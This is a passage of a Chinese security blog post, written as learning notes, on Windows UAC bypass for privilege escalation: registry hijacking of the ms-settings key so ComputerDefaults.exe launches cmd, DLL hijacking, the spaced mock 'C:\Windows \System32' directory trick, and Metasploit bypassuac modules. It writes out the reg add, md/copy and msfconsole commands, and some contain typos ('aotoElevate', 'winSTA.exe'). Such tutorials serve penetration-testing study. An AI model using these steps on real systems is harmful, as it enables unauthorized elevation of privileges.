+<p>当这些程序运行的时候可以通过DLL劫持，DLL注入或者注册表劫持等 绕过DLL去执行我们的恶意程序。</p>
+<p>这里举例注册表劫持：</p>
+<h5 id="2-1-首先使用工具找出白名单的程序。"><a href="#2-1-首先使用工具找出白名单的程序。" class="headerlink" title="2.1 首先使用工具找出白名单的程序。"></a>2.1 首先使用工具找出白名单的程序。</h5><p>在UAC白名单中的程序都有一个特点，就是Mainfest数据中的autoElevate属性的值为True。</p>
+<p>strings.exe 可以检测程序是否有autoElevate 属性，从而找出白名单的程序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings.exe /accepteula -s C:\windows\system32\*.exe | findstr /i &quot;aotoElevate&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>假如ComputerDefaults.exe 进程：</p>
+<p>打开这个exe,没有验证直接进入默认应用界面。</p>
+<p>通过进程监控 分析该进程会发现，它会先去访问HKCU\Software\Classes\ms-settings\shell\open\command，发现没东西后再去访问 HKCR\ms-settings\Shell\Open\Command\DelegateExecute.</p>
+<p>然后我们就可以劫持HKCU\Software\Classes\ms-settings\shell\open\command 中的默认值和 DelegateExecute</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKCU\Software\Classes\ms-settings\shell\open\command&quot; /d &quot;C:\windows\system32\cmd.exe&quot;  #可以是攻击载荷的路径。</span><br><span class="line"></span><br><span class="line">reg add &quot;HKCU\Software\Classes\ms-settings\shell\open\command&quot; /v DelegateExecute /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>当这个应用重启的时候就会反弹或者打开cmd，然后getsystem</p>
+<h2 id="3-DLL劫持"><a href="#3-DLL劫持" class="headerlink" title="3.DLL劫持"></a>3.DLL劫持</h2><p>什么是DLL劫持，程序通常并不是一个完整的可执行文件，被分割成一些DLL文件。当应用程序加载DLL时，如果没有指定DLL的绝对路径，那么程序就会以特定的顺序去遍历搜索加载的DLL，如果将同名的恶意的DLL文件放在真正的DLL之前，那么就会被劫持。这就是劫持。</p>
+<p>但是这前提是这个遍历目录可写。这个目录通常又不可写。所以这个技术通常和模拟可信任技术来配合使用。</p>
+<p>所以提出下面这个 模拟可信任目录</p>
+<h2 id="4-模拟可信任目录"><a href="#4-模拟可信任目录" class="headerlink" title="4.模拟可信任目录"></a>4.模拟可信任目录</h2><p>之前说了UAC白名单中的程序的manifest 数据中的autoElevate为true，当执行的时候，不但要检查这个条件，还要检查这个程序是否在可信任目录C：\windows\system32中。两者缺一不可。但是当系统在检查可信任目录时，会自动去除路径中的空格。比如 </p>
+<p>”C:\Windows   \system32” 会被解析成 “C:\windows\system32”</p>
+<p>那么我们就可以创建一个”C:\Windows   \system32”目录，把白名单中的程序复制进这个含空格的目录中。再把恶意DLL文件放到这个模拟的可信任目录中。然后运行这个模拟目录中的可执行程序。就会达到绕过UAC DLL劫持提权的效果。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">md &quot;\\?\C:\Windows &quot;</span><br><span class="line">md &quot;\\?\C:\Windows \System32&quot;</span><br><span class="line">copy C:\Windows\System32\winSTA.exe  &quot;C:\Windows \System32\winSAT.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>但是制作DLL的时候，要注意恶意DLL的导出函数要与被劫持的DLL一样。</p>
+<p>专业名词解释：DelegateExecute 是 Windows 操作系统中的一个 COM (Component Object Model) 接口，它通常与应用程序扩展和外部处理程序相关。DelegateExecute 接口允许一个应用程序或组件将某些任务委托给其他程序或处理程序来执行，通常是为了增强功能或实现某种定制化的行为。</p>
+<p>Manifest 数据指的是一个应用程序清单（Application Manifest），它是一个用于描述应用程序特性、依赖关系、权限要求以及其他元数据的 XML 文件。应用程序清单通常附加到应用程序的可执行文件（如 .exe 文件）或动态链接库（DLL）中，以便操作系统和其他程序能够正确地识别和与应用程序互动。</p>
+<h2 id="5-使用MSF下的Bypass模块绕过UAC"><a href="#5-使用MSF下的Bypass模块绕过UAC" class="headerlink" title="5.使用MSF下的Bypass模块绕过UAC"></a>5.使用MSF下的Bypass模块绕过UAC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac  #该模块运行时会因为在目标机上创建多个文件而被杀毒软件识别，因此通过该模块提权成功率很低。</span><br><span class="line">use exploit/windows/local/bypassuac_injection  #该模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set session 1</span><br><span class="line">set lhost 0.0.0.0          </span><br><span class="line">set lport 24444                #本地监听的端口，随便设置一个未被占用的端口即可</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://ruan0423.github.io/2023/11/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-Windows%E5%B8%B8%E7%94%A8%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/" title="内网渗透-Windows常用提权方法" target="_blank" rel="external">https://ruan0423.github.io/2023/11/04/内网渗透-Windows常用提权方法/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="" target="_blank"><span class="text-dark">Traveler</span><small class="ml-1x">(((((((((((っ•ω•)っ Σ(σ｀•ω•´)σ 起飞！</small></a></h3>
+        <div>学习笔记记录。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2023/11/06/python%E8%84%9A%E6%9C%AC%E4%B9%8Brequests%E5%BA%93%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/" title="python脚本之requests库上传文件"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2023/11/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/" title="内网渗透-隧道搭建"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/Ruan0423" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: 'Qr1jC5GCcGJRmvAJlssjvQPO-gzGzoHsz',
+    appKey: 'tsXijZklHIrwH2qJV39XrJLd',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
